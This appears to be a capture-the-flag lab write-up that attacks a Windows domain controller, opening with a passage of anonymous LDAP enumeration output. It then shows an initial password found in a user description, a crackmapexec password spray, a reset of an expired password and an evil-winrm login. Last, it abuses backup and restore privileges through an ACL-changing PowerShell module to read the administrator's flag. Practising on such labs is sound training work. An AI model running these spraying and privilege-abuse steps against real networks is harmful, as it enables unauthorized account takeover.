whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Connor Wilkinson
uSNCreated: 12849
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12854
name: Connor Wilkinson
objectGUID:: CSm4NoxCPEGpnplkzZapcw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810684117255
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Connor.Wilkinson
sAMAccountType: 805306368
userPrincipalName: Connor.Wilkinson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Caroline Robinson, it, baby.vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

# Joseph Hughes, it, baby.vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joseph Hughes
sn: Hughes
givenName: Joseph
distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Joseph Hughes
uSNCreated: 12869
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12874
name: Joseph Hughes
objectGUID:: ro0OQulY1U+EZmNSj15XBw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810685992446
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Joseph.Hughes
sAMAccountType: 805306368
userPrincipalName: Joseph.Hughes@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Kerry Wilson, it, baby.vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Kerry Wilson
sn: Wilson
givenName: Kerry
distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Kerry Wilson
uSNCreated: 12879
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12884
name: Kerry Wilson
objectGUID:: vZ3N44jyakmXClchAicbbg==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810686929995
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Kerry.Wilson
sAMAccountType: 805306368
userPrincipalName: Kerry.Wilson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 40
# numEntries: 36
# numReferences: 3
```

Important to mention is that user `Teresa Bell` a possible password in her description. Trying with this user/pw didn't work. But saved for later for a pw spray.

All users and there OU location summarized:

```bash
ldapsearch -x -H ldap://10.10.84.204 -b "DC=baby,DC=vl" "user" | grep dn

dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl

```

Create user list for password spray:

```bash
jacqueline.barnett
ashley.webb
hugh.george
leonard.dyer
connor.wilkinson
joseph.hughes
kerry.wilson
teresa.bell
Administrator
ian.walker
dev
it
caroline.robinson
```

And spray this list:

```bash
crackmapexec smb 10.10.84.204 -u user.txt -p BabyStart123!
SMB         10.10.84.204    445    BABYDC           [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\jacqueline.barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\ashley.webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\hugh.george:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\leonard.dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\connor.wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\joseph.hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\kerry.wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\Administrator:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\ian.walker:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\dev:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.84.204    445    BABYDC           [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE 

```

It seems that `Caroline Robinson` didn't changed her password. As no login is possible without changing her password, we need to change it first.

```bash
smbpasswd -U baby/caroline.robinson -r 10.10.84.204
```

Now we can login with (Evil)WinRM:
```bash
evil-winrm -i 10.10.84.204 -u caroline.robinson -p 'StartBaby123!'
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents>

# User flag at Desktop
```


## Privesc

We have some interesting privileges on this machine:

```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

With the following PowerShell Module I was able to download the root flag - https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1

Note: My Evil-WinRM session crashed while excuting this. But the permissions were set and opening a new session worked just fine. 
```powershell
Import-Module .\Acl-FullControl.ps1

Acl-FullControl -user baby\caroline.robinson -path c:\users\administrator\desktop
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
Owner  : BUILTIN\Administrators
Group  : BABY\Domain Users
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BABY\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:DUD:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)



[+] Changing permissions to c:\users\administrator\desktop
[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator\desktop
Owner  : BUILTIN\Administrators
Group  : BABY\Domain Users
Access : BABY\Caroline.Robinson Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BABY\Administrator Allow  FullControl
Audit  :
Sddl   : O:BAG:DUD:AI(A;OICI;FA;;;S-1-5-21-1407081343-4001094062-1444647654-1111)(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;LA)


download C:\Users\Administrator\Desktop\root.txt

Info: Downloading C:\Users\Administrator\Desktop\root.txt to root.txt
                                        
Info: Download successful!

```
